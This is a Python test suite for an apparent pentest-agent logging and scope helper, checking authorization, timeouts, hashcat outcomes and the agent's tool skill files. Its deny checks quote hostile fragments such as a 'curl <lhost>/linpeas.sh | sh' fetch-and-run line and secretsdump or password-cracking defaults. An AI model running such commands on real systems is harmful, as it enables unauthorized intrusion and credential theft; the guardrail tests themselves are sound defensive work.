"""No-network lifecycle tests; all evidence is synthetic and temporary."""

import json
import ast
import base64
import os
import pathlib
import re
import subprocess
import sys
import tarfile
import tempfile
import time
import unittest
import xml.etree.ElementTree as ElementTree


HELPER = pathlib.Path(__file__).with_name("otus-log.py")


class LoggingTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.home = pathlib.Path(self.temporary.name) / "evidence"
        self.env = {**os.environ, "OTUS_HOME": str(self.home)}
        self.env.pop("OTUS_RUN_DIR", None)

    def call(self, *args, code=0):
        result = subprocess.run([sys.executable, "-I", str(HELPER), *args],
                                env=self.env, capture_output=True, timeout=10)
        self.assertEqual(result.returncode, code, result.stderr.decode())
        return result

    def authorize(self):
        self.call("scope-init", "--engagement", "test", "--authorized-by", "synthetic-test-user",
                  "--confirmed", "--target", "example.test", "--target", "*.example.test",
                  "--target", "192.0.2.0/24")

    def start(self, target=None):
        args = ["init", "--engagement", "test", "--skill", "nuclei"]
        if target:
            args += ["--target", target]
        return pathlib.Path(self.call(*args).stdout.decode().strip())

    def record(self, directory):
        return json.loads((directory / "run.json").read_text())

    def test_scope_exact_glob_cidr_and_exit_codes(self):
        self.call("scope-check", "--engagement", "test", code=3)
        self.authorize()
        for target in ("example.test", "https://API.example.test:443/path", "192.0.2.42"):
            self.call("scope-check", "--engagement", "test", "--target", target)
        for target in ("outside.test", "192.0.3.42"):
            self.call("scope-check", "--engagement", "test", "--target", target, code=2)
        self.call("scope-init", "--engagement", "test", "--authorized-by", "test", "--confirmed",
                  "--target", "outside.test", code=1)

    def test_failure_writes_raw_log_and_error_handback(self):
        self.authorize()
        directory = self.start("example.test")
        self.call("run", "--run-dir", str(directory), "--", sys.executable, "-c",
                  "import sys; print('raw stdout'); print('raw stderr', file=sys.stderr); sys.exit(7)", code=7)
        data = self.record(directory)
        self.assertEqual(data["status"], "error")
        self.assertGreaterEqual(data["finished"], data["started"])
        self.assertIn(b"raw stderr", (directory / "run.log").read_bytes())
        self.assertIn("## Resolution options", (directory / "findings.md").read_text())
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual([event["event"] for event in events], ["run_start", "cmd_start", "cmd", "run_end"])
        self.assertEqual(events[-2]["exit"], 7)

    def test_success_and_archive_roundtrip(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--", sys.executable, "-c", "print('no findings')")
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "No hits",
                  "--item", "scope-confirmed=ok:../../scope.json", "--target-state", "unchanged", "--cleanup", "not-needed")
        self.assertEqual((directory / "run.log").read_text(), "no findings\n")
        bundle = pathlib.Path(self.temporary.name) / "saved.tar.gz"
        self.call("archive", "--engagement", "test", "--out", str(bundle))
        with tarfile.open(bundle) as archive:
            member = archive.extractfile("test/nuclei/" + directory.name + "/run.json")
            self.assertEqual(json.load(member), self.record(directory))
        self.call("archive", "--engagement", "test", "--out", str(self.home / "test/self.tar.gz"), code=1)

    def test_denied_scope_records_error_without_authorization(self):
        directory = self.start()
        self.call("scope-check", "--engagement", "test", "--run-dir", str(directory), code=3)
        self.assertEqual(self.record(directory)["status"], "error")
        self.assertFalse((self.home / "test/scope.json").exists())
        self.call("run", "--run-dir", str(directory), "--", sys.executable, "-c", "print('must not run')", code=1)
        self.assertEqual((directory / "run.log").read_text(), "")

    def test_missing_executable_is_recorded(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--", "/nonexistent/otus-test-command", code=127)
        self.assertEqual(self.record(directory)["status"], "error")
        self.assertIn("Command launch or capture failed", (directory / "run.log").read_text())

    def test_silent_command_has_helper_deadline(self):
        self.authorize()
        directory = self.start()
        started = time.monotonic()
        self.call("run", "--run-dir", str(directory), "--timeout", "0.25", "--grace", "0.2", "--",
                  sys.executable, "-c", "import signal; signal.pause()", code=124)
        self.assertLess(time.monotonic() - started, 3)
        self.assertEqual(self.record(directory)["status"], "error")
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual(events[-2]["execution"]["stop"], "timeout")
        self.assertEqual(events[-2]["execution"]["helper_exit"], 124)
        self.assertEqual(events[-2]["execution"]["child_exit"], -15)

    def test_deadline_preserves_graceful_artifact_even_when_child_exits_zero(self):
        self.authorize()
        directory = self.start()
        artifact = directory / "evidence/native.json"
        command = ("import pathlib, signal, sys; "
                   "signal.signal(signal.SIGTERM, lambda *unused: "
                   "(pathlib.Path(sys.argv[1]).write_text('{\"flushed\": true}'), "
                   "print('graceful flush', flush=True), sys.exit(0))); signal.pause()")
        self.call("run", "--run-dir", str(directory), "--timeout", "0.3", "--grace", "0.5", "--",
                  sys.executable, "-c", command, str(artifact), code=124)
        data = self.record(directory)
        self.assertEqual(data["status"], "error")
        self.assertIn("evidence/native.json", data["evidence"])
        self.assertEqual(json.loads(artifact.read_text()), {"flushed": True})
        self.assertEqual((directory / "run.log").read_text(), "graceful flush\n")
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual(events[-2]["exit"], 0)
        self.assertEqual(events[-2]["execution"]["helper_exit"], 124)

    def test_ignored_termination_is_killed_after_grace(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--timeout", "0.25", "--grace", "0.2", "--",
                  sys.executable, "-c", "import signal; signal.signal(signal.SIGTERM, signal.SIG_IGN); signal.pause()",
                  code=124)
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual(events[-2]["execution"]["child_exit"], -9)

    def test_execution_limits_reject_invalid_durations(self):
        directory = self.start()
        for field, values in (("--timeout", ("0", "-1", "nan", "inf")),
                              ("--grace", ("0", "-1", "nan", "inf", "31"))):
            for value in values:
                self.call("run", "--run-dir", str(directory), field, value, "--",
                          sys.executable, "-c", "pass", code=2)
        self.assertEqual((directory / "run.log").read_text(), "")

    def test_closed_output_and_inherited_pipes_do_not_defeat_deadline(self):
        self.authorize()
        commands = ("import os, signal; os.close(1); os.close(2); signal.pause()",
                    "import os, signal; child = os.fork(); "
                    "signal.signal(signal.SIGTERM, signal.SIG_IGN); "
                    "signal.pause() if child == 0 else os._exit(0)")
        for command in commands:
            with self.subTest(command=command):
                directory = self.start()
                started = time.monotonic()
                self.call("run", "--run-dir", str(directory), "--timeout", "0.25", "--grace", "0.2", "--",
                          sys.executable, "-c", command, code=124)
                self.assertLess(time.monotonic() - started, 3)
                self.assertEqual(self.record(directory)["status"], "error")

    def test_console_backpressure_preserves_raw_output_and_deadline(self):
        self.authorize()
        directory = self.start()
        command = "import os, signal; os.write(1, b'x' * 2097152); signal.pause()"
        with subprocess.Popen([sys.executable, "-I", str(HELPER), "run", "--run-dir", str(directory),
                               "--timeout", "0.5", "--grace", "0.2", "--", sys.executable, "-c", command],
                              env=self.env, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
            self.assertEqual(process.wait(timeout=4), 124)
            process.communicate(timeout=1)
        self.assertEqual((directory / "run.log").read_bytes(), b"x" * 2097152)

    def hashcat_fixture(self, directory, exit_code, native_status, version="6.2.6", progress=None):
        executable = pathlib.Path(self.temporary.name) / "hashcat"
        snapshot = {"session": "synthetic", "guess": {}, "status": native_status,
                    "progress": progress or [100, 100], "recovered_hashes": [1, 2]}
        executable.write_text("#!" + sys.executable + "\nimport sys\n"
                              + "print(" + repr("hashcat (v" + version + ") starting") + ")\n"
                              + "print(" + repr(json.dumps(snapshot)) + ")\n"
                              + "sys.exit(" + str(exit_code) + ")\n")
        executable.chmod(0o700)
        return [str(executable), "-m", "0", "--status-json", "--runtime", "60", "synthetic.hashes", "synthetic.words"]

    def test_hashcat_exhaustion_is_handled_without_claiming_zero_recoveries(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--outcome-policy", "hashcat-v6.2.6", "--timeout", "90",
                  "--", *self.hashcat_fixture(directory, 1, 5))
        data = self.record(directory)
        self.assertEqual(data["status"], "partial")
        self.assertIsNone(data["finished"])
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual(events[-1]["exit"], 1)
        self.assertEqual(events[-1]["execution"]["outcome"], "exhausted")
        self.assertEqual(events[-1]["execution"]["helper_exit"], 0)
        self.assertIn('"recovered_hashes": [1, 2]', (directory / "run.log").read_text())

    def test_hashcat_native_budget_remains_partial(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--outcome-policy", "hashcat-v6.2.6", "--timeout", "90",
                  "--", *self.hashcat_fixture(directory, 4, 11, progress=[25, 100]))
        self.assertEqual(self.record(directory)["coverage"]["stop_reason"], "native-budget")
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "cannot claim complete", code=1)
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "cannot relabel",
                  "--stop-reason", "completed", code=1)
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "cannot hide stop",
              "--stop-reason", "unknown", code=1)
        self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", "Native budget reached",
                  "--observed", "25", "--omitted", "Remaining candidates")
        self.assertIsNotNone(self.record(directory)["finished"])
        self.assertIn("Stop reason: native-budget", (directory / "findings.md").read_text())

    def test_hashcat_policy_fails_closed_on_unknown_or_contradictory_outcome(self):
        self.authorize()
        cases = ((1, 5, "7.0.0", [100, 100]), (1, 11, "6.2.6", [100, 100]),
                 (1, 5, "6.2.6", [25, 100]), (2, 7, "6.2.6", [25, 100]))
        for exit_code, native_status, version, progress in cases:
            with self.subTest(exit_code=exit_code, native_status=native_status, version=version):
                directory = self.start()
                self.call("run", "--run-dir", str(directory), "--outcome-policy", "hashcat-v6.2.6", "--timeout", "90",
                          "--", *self.hashcat_fixture(directory, exit_code, native_status, version, progress), code=exit_code)
                self.assertEqual(self.record(directory)["status"], "error")
        for modifications in ([], ["--show"], ["--runtime=0"]):
            directory = self.start()
            command = self.hashcat_fixture(directory, 1, 5)
            if not modifications:
                command.remove("--status-json")
            command.extend(modifications)
            self.call("run", "--run-dir", str(directory), "--outcome-policy", "hashcat-v6.2.6", "--timeout", "90",
                      "--", *command, code=1)

    def test_strict_policy_and_shell_wrappers_do_not_classify_exhaustion(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--", *self.hashcat_fixture(directory, 1, 5), code=1)
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--outcome-policy", "hashcat-v6.2.6", "--",
                  sys.executable, "-c", 'print("hashcat (v6.2.6) starting"); raise SystemExit(1)', code=1)

    def test_coverage_is_optional_and_counts_are_never_invented(self):
        directory = self.start()
        self.assertNotIn("coverage", self.record(directory))
        self.assertIn("Unknown; no coverage declaration", (directory / "findings.md").read_text())
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "Selected ports only",
                  "--profile", "top-100", "--coverage-set", "Selected 100 TCP ports", "--stop-reason", "completed",
                  "--omitted", "Other TCP ports and UDP")
        self.assertIsNone(self.record(directory)["coverage"]["observed"])
        self.assertIn("Observed units: unknown", (directory / "findings.md").read_text())
        directory = self.start()
        self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", "Test",
                  "--observed", "-1", code=2)

    def test_empty_native_result_has_real_events_and_limited_unknown_coverage(self):
        self.authorize()
        directory = self.start()
        output = directory / "evidence/selected.jsonl"
        self.call("run", "--run-dir", str(directory), "--timeout", "5", "--grace", "1", "--",
                  sys.executable, "-c", "import pathlib, sys; pathlib.Path(sys.argv[1]).touch()", str(output))
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "No selected hits",
                  "--profile", "selected", "--coverage-set", "Selected synthetic cases", "--stop-reason", "completed",
                  "--omitted", "Unselected cases", "--item", "scope-confirmed=ok:../../scope.json")
        data = self.record(directory)
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual([event["event"] for event in events], ["run_start", "cmd_start", "cmd", "run_end"])
        self.assertEqual(events[-2]["execution"]["outcome"], "success")
        self.assertEqual(output.read_bytes(), b"")
        self.assertIn("evidence/selected.jsonl", data["evidence"])
        self.assertIsNone(data["coverage"]["observed"])
        self.assertEqual(data["coverage"]["omitted"], ["Unselected cases"])
        self.assertEqual(data["handback"]["target_state"], "unknown")
        self.assertEqual(data["findings"], [])

    def test_finding_reference_rejects_missing_file_and_precreated_directory(self):
        directory = self.start()
        (directory / "evidence/collection").mkdir()
        for evidence in ("evidence/missing.txt", "evidence/collection"):
            with self.subTest(evidence=evidence):
                self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", "Unproved claim",
                          "--finding", "title=Unproved;severity=info;evidence=" + evidence, code=1)
                self.assertEqual(self.record(directory)["findings"], [])
                self.assertIsNone(self.record(directory)["finished"])

    def test_all_batch_targets_are_checked(self):
        self.authorize()
        directory = self.start()
        hosts = pathlib.Path(self.temporary.name) / "hosts.txt"
        hosts.write_text("example.test\noutside.test\n")
        self.call("run", "--run-dir", str(directory), "--targets-file", str(hosts), "--",
                  sys.executable, "-c", "print('must not run')", code=2)
        self.assertEqual((directory / "run.log").read_text(), "")

    def test_metadata_redacts_arguments(self):
        self.authorize()
        directory = self.start()
        secret = "synthetic-secret-not-a-real-credential"
        self.call("run", "--run-dir", str(directory), "--", sys.executable, "-c", "pass", secret)
        self.assertNotIn(secret, (directory / "events.jsonl").read_text())

    def test_unique_pinned_and_escape_paths(self):
        self.assertNotEqual(self.start(), self.start())
        directory = self.start()
        self.call("init", "--engagement", "test", "--skill", "nuclei", "--run-dir", str(directory), code=1)
        self.call("init", "--engagement", "../escape", "--skill", "nuclei", code=1)
        self.call("init", "--engagement", "test", "--skill", "nuclei", "--run-dir", self.temporary.name, code=1)

    def test_guardrail_event_finalizes_without_command(self):
        directory = self.start()
        self.call("event", "--run-dir", str(directory), "--event", "guardrail_stop",
                  "--block", "guardrail:permission-classifier", "--request-id", "test-request")
        self.assertEqual(self.record(directory)["handback"]["request_id"], "test-request")
        self.assertIn("respected the block", (directory / "findings.md").read_text())
        self.assertEqual((directory / "run.log").read_text(), "")

    def test_cleanup_and_finding_validation(self):
        self.authorize()
        directory = self.start()
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "done",
                  "--target-state", "changed", "--cleanup", "verified", code=1)
        proof = directory / "evidence/proof.txt"
        proof.write_text("synthetic proof\n")
        self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", "cleanup owed",
                  "--finding", "title=Test;severity=info;evidence=evidence/proof.txt",
                  "--target-state", "changed", "--cleanup", "owed", "--artifact", "synthetic artifact")
        self.assertIn("Test", (directory / "findings.md").read_text())

    def test_timeout_and_signal_finalize_error(self):
        self.authorize()
        for command, exit_code in (("import sys; sys.exit(124)", 124),
                                   ("import os, signal; os.kill(os.getppid(), signal.SIGTERM)", 143)):
            directory = self.start()
            self.call("run", "--run-dir", str(directory), "--", sys.executable, "-c", command, code=exit_code)
            self.assertEqual(self.record(directory)["status"], "error")

    def test_error_can_be_enriched_but_never_reopened(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--", sys.executable, "-c", "raise SystemExit(1)", code=1)
        self.call("finish", "--run-dir", str(directory), "--status", "error", "--summary", "failed after change",
                  "--target-state", "changed", "--cleanup", "owed", "--artifact", "synthetic artifact")
        self.assertEqual(self.record(directory)["handback"]["cleanup"], "owed")
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "cannot reopen", code=1)

    def test_symlinks_and_invalid_scope_are_rejected(self):
        self.authorize()
        scope = self.home / "test/scope.json"
        for malformed in ('{"schema": "bad"}', "[]", "null", "false", "42"):
            scope.write_text(malformed)
            self.call("scope-check", "--engagement", "test", code=3)
        directory = self.start()
        (directory / "evidence/link").symlink_to(pathlib.Path(self.temporary.name))
        self.call("finish", "--run-dir", str(directory), "--status", "complete", "--summary", "reject symlink", code=1)

    def test_authorization_requires_explicit_confirmation(self):
        self.call("scope-init", "--engagement", "test", "--authorized-by", "test", "--target", "example.test", code=1)
        self.assertFalse((self.home / "test/scope.json").exists())

    def test_partial_cleanup_is_visible_in_rendered_findings(self):
        directory = self.start()
        self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", "Unfinished",
                  "--target-state", "changed", "--cleanup", "owed", "--artifact", "synthetic artifact")
        self.assertIn("Cleanup: owed", (directory / "findings.md").read_text())
        self.assertIn("synthetic artifact", (directory / "findings.md").read_text())

    def test_pipeline_preserves_upstream_failure(self):
        self.authorize()
        directory = self.start()
        self.call("run", "--run-dir", str(directory), "--", "/bin/bash", "-o", "pipefail", "-c",
                  "printf 'one raw line\\n'; false | cat", code=1)
        self.assertEqual((directory / "run.log").read_text(), "one raw line\n")

    def test_json_escaping_and_evidence_inventory(self):
        directory = self.start()
        summary = 'Quoted "text", slash \\, and newline\n'
        self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", summary)
        self.assertEqual(self.record(directory)["summary"], summary)
        for filename in ("run.json", "events.jsonl", "run.log", "findings.md"):
            self.assertIn(filename, self.record(directory)["evidence"])

    def test_parallel_events_have_unique_ordered_sequences(self):
        directory = self.start()
        processes = [subprocess.Popen([sys.executable, "-I", str(HELPER), "event", "--run-dir", str(directory),
                                       "--event", "marker", "--note", "synthetic step"], env=self.env,
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE) for index in range(6)]
        for process in processes:
            output, errors = process.communicate(timeout=10)
            self.assertEqual(process.returncode, 0, errors.decode())
        events = [json.loads(line) for line in (directory / "events.jsonl").read_text().splitlines()]
        self.assertEqual([event["seq"] for event in events], list(range(1, 8)))

    def test_default_root_is_repo_out_without_writing_there(self):
        environment = dict(self.env)
        environment.pop("OTUS_HOME")
        result = subprocess.run([sys.executable, "-I", "-c",
                                 "import runpy, sys; print(runpy.run_path(sys.argv[1])['root']())", str(HELPER)],
                                env=environment, capture_output=True, timeout=10, check=True)
        self.assertEqual(pathlib.Path(result.stdout.decode().strip()), HELPER.parent.parent / "out")

    def test_archive_restores_every_evidence_file(self):
        directory = self.start()
        self.call("finish", "--run-dir", str(directory), "--status", "partial", "--summary", "Synthetic")
        destination = pathlib.Path(self.temporary.name) / "export.tar.gz"
        self.call("archive", "--engagement", "test", "--out", str(destination))
        restored = pathlib.Path(self.temporary.name) / "restored"
        with tarfile.open(destination) as bundle:
            bundle.extractall(restored, filter="data")
        for original in (self.home / "test").rglob("*"):
            if original.is_file():
                self.assertEqual(original.read_bytes(), (restored / original.relative_to(self.home)).read_bytes())

    def test_skill_root_is_rejected(self):
        self.env["OTUS_HOME"] = str(HELPER.parent.parent / ".claude/skills")
        self.call("init", "--engagement", "test", "--skill", "nuclei", code=1)


class WiringTests(unittest.TestCase):
    def test_authoring_template_and_readme_use_real_bounded_ownership(self):
        repo = HELPER.parent.parent
        template = (repo / "templates/SKILL.template.md").read_text()
        guide = (repo / "docs/authoring.md").read_text()
        readme = (repo / "README.md").read_text()
        self.assertIn("context: fork", template)
        self.assertIn("background: false", template)
        self.assertNotIn("general-purpose", template)
        self.assertIn("--timeout 60 --grace 5", template)
        self.assertIn("notes/task.md", template)
        self.assertIn("Preserve native empty files unchanged", template)
        self.assertIn("### 3.2 Runtime discovery and startup acceptance", guide)
        self.assertNotIn("max_part_retries", guide)
        self.assertNotIn('echo "no findings" > nuclei.txt', guide)
        self.assertIn("terminal partial/native-budget", guide)
        self.assertNotRegex(guide, re.compile(r"^#### .*`(?:max|xhigh|[^`]+inline|[^`]+Explore|[^`]+general-purpose)`", re.MULTILINE))
        for obsolete in ("--min-rate 2000", "nuclei -update-templates", "--level 3 --risk 2", "-c All", "curl <lhost>/linpeas.sh | sh"):
            self.assertNotIn(obsolete, guide)
        for source in ("AutoRecon", "reconFTW", "PentestGPT", "OWASP WSTG", "FFUF v2.1.0", "Hashcat v6.2.6"):
            self.assertIn(source, guide)
        self.assertNotIn("skillDirectories", readme)
        self.assertIn(".github/agents/otus.agent.md", readme)
        self.assertIn("reporter shell assembly was unavailable", readme)

    def test_review_is_locked_and_report_requires_individual_proof_and_coverage(self):
        repo = HELPER.parent.parent
        review = (repo / ".claude/skills/review/SKILL.md").read_text()
        reviewer = (repo / ".claude/agents/reviewer.md").read_text()
        reporter = (repo / ".claude/agents/reporter.md").read_text()
        self.assertNotIn("scripts/otus-log.py", review)
        self.assertNotIn("max_part_retries", review)
        self.assertIn("actual coordinator-supplied reviewed_utc", review)
        self.assertIn("Write ONLY assigned", review)
        self.assertIn("native-budget partial -> no replay", review)
        self.assertIn("evidence: review.json", review)
        self.assertIn("never prescribe", reviewer)
        self.assertIn("goal-coverage-accurate", reporter)
        self.assertIn("hard-error/unfinished/legacy runs excluded", reporter)
        self.assertIn("including masked prefixes", reporter)
        self.assertIn("individually reviewed proof", reporter)
        self.assertIn("actually enforced", reporter)

    def test_packet_binary_and_pwn_analysis_prove_work_not_directories(self):
        repo = HELPER.parent.parent
        tshark = (repo / ".claude/skills/wireshark/SKILL.md").read_text()
        ghidra = (repo / ".claude/skills/ghidra/SKILL.md").read_text()
        pwn = (repo / ".claude/skills/pwntools/SKILL.md").read_text()
        self.assertIn('tshark -n -r "$PCAP" -c 10000', tshark)
        self.assertIn("at most three relevant streams/artifacts", tshark)
        self.assertIn("selected capture", tshark)
        self.assertIn("-analysisTimeoutPerFile 240", ghidra)
        self.assertNotIn("-overwrite", ghidra)
        self.assertNotIn("evidence: project", ghidra)
        self.assertIn("context.timeout = 3", pwn)
        self.assertIn("finally: io.close()", pwn)
        self.assertNotIn("gdb.attach(", pwn)
        self.assertIn('--target "$HOST" --timeout 60', pwn)
        for text in (tshark, ghidra, pwn):
            self.assertIn("notes/task.md", text)
            self.assertNotIn("evidence: findings.md", text)
            self.assertIn("--stop-reason", text)

    def test_cracking_and_extraction_use_isolated_bounded_hypotheses(self):
        repo = HELPER.parent.parent
        hashcat = (repo / ".claude/skills/hashcat/SKILL.md").read_text()
        binwalk = (repo / ".claude/skills/binwalk/SKILL.md").read_text()
        stego = (repo / ".claude/skills/steghide/SKILL.md").read_text()
        for option in ("--timeout 90", "--runtime 60", "--status --status-json",
                       '--potfile-path "$RUN/loot/hashcat.pot"', '--restore-file-path "$RUN/loot/hashcat.restore"'):
            self.assertIn(option, hashcat)
        self.assertIn("exit 4/status 11 is native-budget partial", hashcat)
        self.assertNotIn("WL=/usr/share/wordlists/rockyou.txt", hashcat)
        self.assertNotIn("-- binwalk -Me", binwalk)
        self.assertIn("<=100 files, <=100 MiB total and <=2 layers", binwalk)
        self.assertIn("if enforcement is unavailable", binwalk)
        self.assertIn('steghide info "$SF" -p "$PASS"', stego)
        self.assertNotIn('"${2-}"', stego)
        self.assertNotIn("${3:-/usr/share/wordlists/rockyou.txt}", stego)
        self.assertIn("do not fall through to another branch", stego)
        for text in (hashcat, binwalk, stego):
            self.assertIn("notes/task.md", text)
            self.assertNotIn("evidence: findings.md", text)
            self.assertIn("--stop-reason", text)

    def test_ad_defaults_select_one_protocol_and_real_collection_proof(self):
        repo = HELPER.parent.parent
        nxc = (repo / ".claude/skills/netexec/SKILL.md").read_text()
        bloodhound = (repo / ".claude/skills/bloodhound/SKILL.md").read_text()
        impacket = (repo / ".claude/skills/impacket/SKILL.md").read_text()
        self.assertNotIn("-u '' -p ''", nxc)
        self.assertNotIn("--shares --users --rid-brute", nxc)
        self.assertIn('nxc "$PROTOCOL" "$TARGET"', nxc)
        self.assertNotIn("-c All", bloodhound)
        self.assertIn("-c Group,ACL", bloodhound)
        self.assertIn("real import receipt/log", bloodhound)
        self.assertIn("recollect only after a recorded relevant", bloodhound)
        self.assertNotIn("evidence: collection", bloodhound)
        self.assertNotIn("-- secretsdump", impacket)
        self.assertIn("No held relay/listener", impacket)
        self.assertIn("<=60-second command cap", impacket)
        for text in (nxc, bloodhound, impacket):
            self.assertNotIn("evidence: findings.md", text)
            self.assertIn("notes/task.md", text)
            self.assertIn("--stop-reason", text)

    def test_local_escalation_is_selected_noninteractive_and_conditional(self):
        repo = HELPER.parent.parent
        metasploit = (repo / ".claude/skills/metasploit/SKILL.md").read_text()
        peass = (repo / ".claude/skills/linpeas/SKILL.md").read_text()
        privesc = (repo / ".claude/skills/privesc-root/SKILL.md").read_text()
        self.assertNotIn("check; run", metasploit)
        self.assertNotIn("sessions -i", metasploit)
        self.assertIn("never combine check and run", metasploit)
        self.assertIn("remote-native <=150-second bound", peass)
        self.assertNotIn("sh -s -- -a", peass)
        self.assertNotIn("curl <lhost_url>", peass)
        self.assertNotIn("find /", privesc)
        self.assertIn("sudo -n -l", privesc)
        self.assertIn("without rerunning an actionful escalation", privesc)
        proof = privesc.split("- id: root-proof", 1)[1].split("```", 1)[0]
        self.assertIn("required: false", proof)
        self.assertNotIn("redo-skill", proof)
        for text in (metasploit, peass, privesc):
            self.assertIn("notes/task.md", text)
            self.assertIn("--timeout", text)
            self.assertNotIn("evidence: findings.md", text)

    def test_access_attempts_are_conditional_and_not_replayed(self):
        repo = HELPER.parent.parent
        ssh = (repo / ".claude/skills/ssh-foothold/SKILL.md").read_text()
        hydra = (repo / ".claude/skills/hydra/SKILL.md").read_text()
        exploit = (repo / ".claude/skills/exploitation/SKILL.md").read_text()
        self.assertIn("--timeout 30", ssh)
        self.assertIn("StrictHostKeyChecking=accept-new", ssh)
        self.assertNotIn("find /", ssh)
        self.assertNotIn("a complete run", ssh)
        self.assertIn("Unknown policy/remaining allowance -> not-tested/partial", hydra)
        self.assertIn('-C "$PAIRS" -I -t 1 -f', hydra)
        self.assertNotIn("-L users.txt -P pass.txt", hydra)
        self.assertNotIn("evidence: findings.md", hydra)
        self.assertIn("absent impact is partial", exploit)
        proof = exploit.split("- id: rce-or-impact-proof", 1)[1].split("```", 1)[0]
        self.assertIn("required: false", proof)
        self.assertNotIn("redo-skill", proof)
        for text in (ssh, hydra, exploit):
            self.assertIn("notes/task.md", text)
            self.assertIn("--stop-reason", text)

    def test_web_defaults_are_selected_bounded_and_evidence_backed(self):
        repo = HELPER.parent.parent
        nuclei = (repo / ".claude/skills/nuclei/SKILL.md").read_text()
        sqlmap = (repo / ".claude/skills/sqlmap/SKILL.md").read_text()
        for option in ("-c 2", "-bs 1", "-rate-limit 10", "-timeout 5", "-retries 0", "-mhe 5", "-dr -ni -duc"):
            self.assertIn(option, nuclei)
        self.assertNotIn("-update-templates", nuclei)
        self.assertNotIn("git clone", nuclei)
        self.assertIn("Preserve empty native JSONL unchanged", nuclei)
        self.assertIn("--level 1 --risk 1 --threads 1", sqlmap)
        self.assertIn('-p "$PARAM"', sqlmap)
        self.assertIn('--output-dir "$RUN/sqlmap-output"', sqlmap)
        self.assertNotIn('"${2:-3}"', sqlmap)
        for skill in ("nuclei", "sqlmap", "xss", "ssrf", "idor", "burpsuite"):
            with self.subTest(skill=skill):
                text = (repo / ".claude/skills" / skill / "SKILL.md").read_text()
                self.assertIn("notes/task.md", text)
                self.assertRegex(text, r"--timeout (?:15|120|180)")
                self.assertNotIn("evidence: findings.md", text)
                self.assertIn("--stop-reason", text)
        self.assertIn("Missing second identity -> not-tested/partial", (repo / ".claude/skills/idor/SKILL.md").read_text())
        self.assertIn("No usable GUI -> partial", (repo / ".claude/skills/burpsuite/SKILL.md").read_text())

    def test_httpx_handoff_preserves_schemes_ports_and_empty_results(self):
        repo = HELPER.parent.parent
        text = (repo / ".claude/skills/httpx/SKILL.md").read_text()
        script = re.search(r"-- python3 -c '([^']+)'", text).group(1)
        with tempfile.TemporaryDirectory() as temporary:
            evidence = pathlib.Path(temporary) / "httpx.jsonl"
            records = [{"url": "https://example.test:8443/admin", "status_code": 200},
                       {"url": "http://example.test:8080/", "status_code": 301},
                       {"url": "http://example.test:8080/", "status_code": 301}]
            evidence.write_text("\n".join(json.dumps(record) for record in records) + "\n")
            result = subprocess.run([sys.executable, "-c", script, str(evidence)],
                                    capture_output=True, timeout=5, check=True)
            self.assertEqual(result.stdout.decode(), "https://example.test:8443/admin\nhttp://example.test:8080/\n")
            evidence.write_text("")
            result = subprocess.run([sys.executable, "-c", script, str(evidence)],
                                    capture_output=True, timeout=5, check=True)
            self.assertEqual(result.stdout, b"")
        self.assertIn('"$HTTPX" -version', text)
        self.assertIn("-no-fallback-scheme", text)
        self.assertIn("handoff-written=ok:notes/urls.txt", text)
        self.assertNotIn("handoff-written=ok:live.txt", text)

    def test_bounded_nmap_and_ffuf_profiles_use_real_evidence(self):
        repo = HELPER.parent.parent
        nmap = (repo / ".claude/skills/port-scanner/SKILL.md").read_text()
        ffuf = (repo / ".claude/skills/ffuf/SKILL.md").read_text()
        self.assertIn("--top-ports 100", nmap)
        self.assertNotIn("--min-rate", nmap)
        self.assertNotIn("allports-scan", nmap)
        self.assertNotIn("-- nmap -p-", nmap)
        self.assertIn("--version-light", nmap)
        self.assertIn("declared-profile-scan=ok:scans/initial.xml", nmap)
        script, port_script = re.findall(r"-- python3 -c '([^']+)'", nmap)
        with tempfile.TemporaryDirectory() as temporary:
            scan = pathlib.Path(temporary) / "scan.xml"
            scan.write_text('<nmaprun><host><ports><port protocol="tcp" portid="22">'
                            '<state state="open"/><service name="ssh"/></port>'
                            '<port protocol="tcp" portid="80"><state state="filtered"/></port>'
                            '</ports></host></nmaprun>')
            result = subprocess.run([sys.executable, "-c", script, str(scan)], capture_output=True, timeout=5, check=True)
            self.assertEqual(json.loads(result.stdout), [{"port": 22, "protocol": "tcp", "service": {"name": "ssh"}}])
            scan.write_text('<nmaprun><host><ports/></host></nmaprun>')
            result = subprocess.run([sys.executable, "-c", script, str(scan)], capture_output=True, timeout=5, check=True)
            self.assertEqual(json.loads(result.stdout), [])
            inventory = pathlib.Path(temporary) / "inventory.json"
